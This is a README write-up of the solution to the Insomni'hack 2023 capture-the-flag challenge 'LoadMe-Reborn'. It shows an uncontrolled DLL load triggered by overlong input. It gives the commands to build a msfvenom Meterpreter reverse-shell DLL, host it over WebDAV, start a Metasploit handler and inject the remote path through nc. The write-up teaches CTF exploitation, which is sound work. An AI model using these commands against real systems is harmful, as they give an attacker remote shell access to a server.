# Insomni'hack - LoadMe-Reborn   
This repository is a solution for the flag LoadMe-Reborn for 2023's editions of insomni'hack.
## The flag   
The flags begin with a simple instructions, that someone had developped an application to do a recipe with given components. They give us a nc command so we can connect to the app :
(I have forgot the command that they gave us, but it should be like this one)
```
nc 10.1.2.13 1234
```
Then, we have a beautiful cli's app that ask us for ingredients so they can cook, if you try to write some ingredients and hit enter, it'll tell us that the kitchen is closed. But it'll echo back the ingredients that we had typed before closing.
The simple trick here is to type list a ingredients so long that they will be an error. The important line in the error is that he has tried to load a DLL library but it was unable to load it, simply because it doesn'it exists ! It has tried to load a DLL with the end of the string that you had typed, so from here we can execute a DLL library of our choice, even our own !   
So we need to have a DLL that can do a reverse shell so we can have access to the server that is running the app. For that I have used msfvenom (.DLL in uppercase) : 
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=myIPAdress LPORT=4444 -f dll -o msf.DLL
```
And then we need a share that the server can use, the first thing that I had tried is smb share, but unfortunately, it has been blocked via a regex, so we need another technology, the next this I tried was webdav and it worked !
You need to host a webdav server, for that I have used wsgidav, it is a generic and extendable WebDAV server written in Python and based on WSGI. I have used this command, you need to launch it where you have generated your DLL library.
```
wsgidav --host=0.0.0.0 --port=80 --root=./ --auth=anonymous
```
Before loading your library on the server, you need to prepare for the reverse shell with those command :
```
./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost your_ip_address
lhost => your_ip_address
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run
```
And the you can launch your DLL on the server with this command : 
```
echo '(stringlongenoughtodotheerror)//youripadress@80/msf' | nc 10.1.2.13 1234
```
It'll launch the nc command and enter the string between the quotes in the app. Now in the shell where you have executed the reverse shell command, you have now access to the server and can get the flag who is in the .txt file !
## Sources
msfvenom : 
* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
* https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html

wsgidav :
* https://wsgidav.readthedocs.io/en/latest/
